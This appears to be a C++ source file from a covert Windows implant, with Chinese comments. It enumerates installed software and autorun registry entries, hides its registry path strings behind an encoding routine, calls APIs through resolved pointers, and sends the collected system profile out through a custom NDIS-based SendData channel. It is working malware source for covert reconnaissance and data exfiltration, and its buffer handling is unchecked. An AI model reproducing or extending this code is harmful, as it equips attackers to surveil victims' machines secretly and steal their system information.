// getSoftwareinfo.cpp: implementation of the getSoftwareinfo class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "getSoftwareinfo.h"
#include "NdisSocket.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

//返回buf长
int EnumInstalled(char* buf)
{
	HKEY hkey;          
	unsigned long SubKeyCnt;
	char pn[8*MAX_PATH];
	char sDisplayName[2*MAX_PATH+10];
	char sDisplayVersion[2*MAX_PATH+10];
	char sInstallDate[2*MAX_PATH+10];
	char sInstallLocation[2*MAX_PATH+10];
	char skn[2*MAX_PATH+10];
	HKEY hsubkey;
	unsigned long len;
	int res;
	unsigned long type;
	unsigned long i;
	int offset=0;
	char TmpDeStr[100];
	int count = 0;

	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
	if(PRegOpenKeyExA(HKEY_LOCAL_MACHINE, SysinfStringA(TmpDeStr, 100, "fBIgxJwF\\4aAXLSL2p\\xaWOLMS\\9oXX8Wpc8XSaLW\\bWaWSpzrr"), 0, KEY_READ|KEY_WOW64_64KEY, &hkey) == ERROR_SUCCESS) //打开键失败
	{
		if(PRegQueryInfoKeyA(hkey,NULL,NULL,NULL,&SubKeyCnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL) == ERROR_SUCCESS)	//查询子键数量失败
		{
			for(i=0;i<SubKeyCnt;i++)
			{
				len=2*MAX_PATH+10-1;
				if(PRegEnumKeyExA(hkey,i,skn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
					continue;
				
				if(PRegOpenKeyExA(hkey,skn,0,KEY_QUERY_VALUE,&hsubkey)!=ERROR_SUCCESS) //打开键失败
					continue;
				
				memset(sDisplayName, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//DisplayName
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "CaSDrz1kzY8"), 0, &type, (unsigned char *)sDisplayName, &len);
				
				if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
				{
					PRegCloseKey(hsubkey);
					continue;
				}
				
				memset(sDisplayVersion, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//DisplayVersion
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "CaSDrz1c8XSaLW"), 0, &type, (unsigned char *)sDisplayVersion, &len);
				memset(sInstallDate, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallDate
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrCzp8"), 0, &type, (unsigned char *)sInstallDate, &len);
				memset(sInstallLocation, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallLocation
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrdLAzpaLW"), 0, &type, (unsigned char *)sInstallLocation, &len);
				
				PRegCloseKey(hsubkey);
				
				memset(pn, 0, 8*MAX_PATH);
				sprintf(pn, "%d\t%s\t%s\t%s\t%s\r\n", count, sDisplayName, sDisplayVersion, sInstallDate, sInstallLocation);
				memcpy(buf+offset, pn, strlen(pn));
				offset += strlen(pn);
				count++;
			}
		}

		PRegCloseKey(hkey);
	}

	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
	if(PRegOpenKeyExA(HKEY_LOCAL_MACHINE, SysinfStringA(TmpDeStr, 100, "fBIgxJwF\\4aAXLSL2p\\xaWOLMS\\9oXX8Wpc8XSaLW\\bWaWSpzrr"), 0, KEY_READ, &hkey) == ERROR_SUCCESS) //打开键失败
	{
		if(PRegQueryInfoKeyA(hkey,NULL,NULL,NULL,&SubKeyCnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL) == ERROR_SUCCESS)	//查询子键数量失败
		{
			for(i=0;i<SubKeyCnt;i++)
			{
				len=2*MAX_PATH+10-1;
				if(PRegEnumKeyExA(hkey,i,skn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
					continue;
				
				if(PRegOpenKeyExA(hkey,skn,0,KEY_QUERY_VALUE,&hsubkey)!=ERROR_SUCCESS) //打开键失败
					continue;
				
				memset(sDisplayName, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//DisplayName
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "CaSDrz1kzY8"), 0, &type, (unsigned char *)sDisplayName, &len);
				
				if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
				{
					PRegCloseKey(hsubkey);
					continue;
				}
				
				memset(sDisplayVersion, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//DisplayVersion
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "CaSDrz1c8XSaLW"), 0, &type, (unsigned char *)sDisplayVersion, &len);
				memset(sInstallDate, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallDate
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrCzp8"), 0, &type, (unsigned char *)sInstallDate, &len);
				memset(sInstallLocation, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallLocation
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrdLAzpaLW"), 0, &type, (unsigned char *)sInstallLocation, &len);
				
				PRegCloseKey(hsubkey);
				
				memset(pn, 0, 8*MAX_PATH);
				sprintf(pn, "%d\t%s\t%s\t%s\t%s\r\n", count, sDisplayName, sDisplayVersion, sInstallDate, sInstallLocation);
				memcpy(buf+offset, pn, strlen(pn));
				offset += strlen(pn);
				count++;
			}
		}
		
		PRegCloseKey(hkey);
	}

	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall
	if(PRegOpenKeyExA(HKEY_CURRENT_USER, SysinfStringA(TmpDeStr, 100, "fBIgxJwF\\4aAXLSL2p\\xaWOLMS\\9oXX8Wpc8XSaLW\\bWaWSpzrr"), 0, KEY_READ,&hkey) == ERROR_SUCCESS) //打开键失败
	{
		if(PRegQueryInfoKeyA(hkey,NULL,NULL,NULL,&SubKeyCnt,NULL,NULL,NULL,NULL,NULL,NULL,NULL) == ERROR_SUCCESS)	//查询子键数量失败
		{
			for(i=0;i<SubKeyCnt;i++)
			{
				len=2*MAX_PATH+10-1;
				if(PRegEnumKeyExA(hkey,i,skn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
					continue;
				
				if(PRegOpenKeyExA(hkey,skn,0,KEY_QUERY_VALUE,&hsubkey)!=ERROR_SUCCESS) //打开键失败
					continue;
				
				memset(sDisplayName, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				res=PRegQueryValueExA(hsubkey,"DisplayName",0,&type,(unsigned char *)sDisplayName,&len);
				
				if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
				{
					PRegCloseKey(hsubkey);
					continue;
				}
				
				memset(sDisplayVersion, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//DisplayVersion
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "CaSDrz1c8XSaLW"), 0, &type, (unsigned char *)sDisplayVersion, &len);
				memset(sInstallDate, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallDate
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrCzp8"), 0, &type, (unsigned char *)sInstallDate, &len);
				memset(sInstallLocation, 0, 2*MAX_PATH+10);
				len=2*MAX_PATH+10-1;
				//InstallLocation
				res=PRegQueryValueExA(hsubkey, SysinfStringA(TmpDeStr, 100, "UWSpzrrdLAzpaLW"), 0, &type, (unsigned char *)sInstallLocation, &len);
				
				PRegCloseKey(hsubkey);
				
				memset(pn, 0, 8*MAX_PATH);
				sprintf(pn, "%d\t%s\t%s\t%s\t%s\r\n", count, sDisplayName, sDisplayVersion, sInstallDate, sInstallLocation);
				memcpy(buf+offset, pn, strlen(pn));
				offset += strlen(pn);
				count++;
			}
		}
		
		PRegCloseKey(hkey);
	}


	if (offset != 0)
	{
		offset += sprintf(buf+offset,"%d",count);
	}

	return offset;
}

DWORD WINAPI GetInstall(LPVOID lp)
{
	try{
		char *p=0;//目录名
		char tmpbuf[1024];
		//取补丁信息
		/*		char *UpdateInfo;*/
		char* pBuffer;
		int offset = 1024;
		
		pBuffer = new char[102400];
		ZeroMemory(pBuffer,102400);
		
		int tmp=EnumInstalled(pBuffer+offset);
		if(offset > 0)
		{
			offset+=tmp;
			
			// 生成描述信息
			SYSTEMTIME nowtime;
			PGetLocalTime(&nowtime);
			
			char sysinfopath[20];
			char curtm[20];
			sprintf(sysinfopath,"%04d%02d%02d",nowtime.wYear, nowtime.wMonth, nowtime.wDay);
			sprintf(curtm,"%02d%02d%02d",nowtime.wHour, nowtime.wMinute, nowtime.wSecond);
			
			int len = sprintf(tmpbuf, "time: %04d%02d%02d%02d%02d%02d\r\ncontent-length: %d\r\ncontent-type: installinfo_v1\r\n\r\n",
				nowtime.wYear, nowtime.wMonth, nowtime.wDay,
				nowtime.wHour, nowtime.wMinute, nowtime.wSecond, offset-1024);//installinfo_v1 2018 05
			
			int datalen = offset-1024 + len;
			memcpy(pBuffer+1024-len, tmpbuf, len);
			
			WCHAR* pUnicode = new WCHAR[datalen+10];
			datalen = (datalen+10)*sizeof(WCHAR);
			datalen = GB23122Unicode(pBuffer+1024-len, pUnicode, datalen);
			delete[] pBuffer;
			datalen *= 4;
			pBuffer = new char[datalen];
			datalen = Unicode2UTF_8(pUnicode, pBuffer, datalen-1);
	#ifdef _DEBUG
			FILE * fs;
			fs=fopen("z:\\systeminfo.txt","w+b");
			fwrite(pBuffer,1,datalen,fs);
			fclose(fs);
	#endif	
			
			if(SendData(pBuffer, datalen, PTYPE_INSTALLINFO, GetFatAutoSendID()))
			{
			}
		}
		delete[] pBuffer;
	}
	catch (...)
	{
		IF_LOUD(DbgFat32Log("GetInstall Catch Error!\r\n");)
			return FALSE;
	} 
	
	return 0;
}

DWORD ThreadGetSoftwareStart(char * pPara)
{
	DWORD dwID;
	
	HANDLE hthread=CreateThread(
		NULL,
		NULL, 
		GetInstall, 
		NULL,
		NULL, 
		&dwID);
	if (hthread != NULL)
	{
		CloseHandle(hthread);
	}
	
	return 0;
}

int EnumRun(WCHAR * buf)
{
	HKEY hkey;          
	unsigned long ValueCnt;
	WCHAR rn[2*MAX_PATH+10];
	WCHAR vn[2*MAX_PATH+10];
	unsigned long len;
	int res;
	unsigned long type;
	int offset=0;
	unsigned long i=0;
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
	if(PRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hkey) != ERROR_SUCCESS) //打开键失败
		goto error;
	
	if(RegQueryInfoKeyW(hkey, NULL, NULL, NULL, NULL, NULL, NULL, &ValueCnt, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)	//查询值数量失败
	{
		PRegCloseKey(hkey);
		goto error;
	}
	
	for(i=0; i<ValueCnt; i++)
	{
		len = 2*MAX_PATH+10-1;
		
		if(PRegEnumValueW(hkey,i,vn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
			continue;
		
		len=2*MAX_PATH+10-1;
		memset(rn, 0, sizeof(rn));
		res=PRegQueryValueExW(hkey,vn,0,&type,(unsigned char *)rn,&len);
		
		if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
			continue;
		
		len = wcslen(rn);
		wcsncpy(buf+offset, rn, len);
		offset += len;
		wcsncpy(buf+offset, L"\r\n", 2);
		offset += 2;
		
	}
	
	PRegCloseKey(hkey);

	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
	if(PRegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ|KEY_WOW64_64KEY, &hkey) != ERROR_SUCCESS) //打开键失败
		goto error;
	
	if(RegQueryInfoKeyW(hkey, NULL, NULL, NULL, NULL, NULL, NULL, &ValueCnt, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)	//查询值数量失败
	{
		PRegCloseKey(hkey);
		goto error;
	}
	
	for(i=0; i<ValueCnt; i++)
	{
		len = 2*MAX_PATH+10-1;
		
		if(PRegEnumValueW(hkey,i,vn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
			continue;
		
		len=2*MAX_PATH+10-1;
		memset(rn, 0, sizeof(rn));
		res=PRegQueryValueExW(hkey,vn,0,&type,(unsigned char *)rn,&len);
		
		if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
			continue;
		
		len = wcslen(rn);
		wcsncpy(buf+offset, rn, len);
		offset += len;
		wcsncpy(buf+offset, L"\r\n", 2);
		offset += 2;
		
	}
	
	PRegCloseKey(hkey);
	
	//SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
	if(PRegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hkey) != ERROR_SUCCESS) //打开键失败
		goto error;
	
	if(RegQueryInfoKeyW(hkey, NULL, NULL, NULL, NULL, NULL, NULL, &ValueCnt, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)	//查询值数量失败
	{
		PRegCloseKey(hkey);
		goto error;
	}
	
	for(i=0;i<ValueCnt;i++)
	{
		len=2*MAX_PATH+10-1;
		if(PRegEnumValueW(hkey,i,vn,&len,NULL,NULL,NULL,NULL)!=ERROR_SUCCESS)	//枚举子键名称失败
			continue;
		
		len=2*MAX_PATH+10-1;
		memset(rn, 0, sizeof(rn));
		res=PRegQueryValueExW(hkey,vn,0,&type,(unsigned char *)rn,&len);
		
		if(res!=ERROR_SUCCESS||type!=REG_SZ)	//查询键值失败,或者值类型不对
			continue;
		
		len = wcslen(rn);
		wcsncpy(buf+offset, rn, len);
		offset+=len;
		wcsncpy(buf+offset, L"\r\n", 2);
		offset+=2;
		
	}
	
	PRegCloseKey(hkey);
	
	return offset;
error:
	
	offset = wcslen(L"无自动运行信息");
	wcsncpy(buf, L"无自动运行信息", offset);
	return offset;
}
